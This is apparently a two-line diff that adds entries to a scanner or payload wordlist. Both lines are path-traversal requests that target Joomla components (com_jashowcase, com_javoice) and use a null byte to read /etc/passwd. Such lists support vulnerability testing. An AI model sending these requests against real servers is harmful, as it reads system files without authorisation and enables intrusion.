@@ -1,0 +1,2 @@
+/index.php?option=com_jashowcase&view=jashowcase&controller=../../../../../../../etc/passwd%00
+/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00
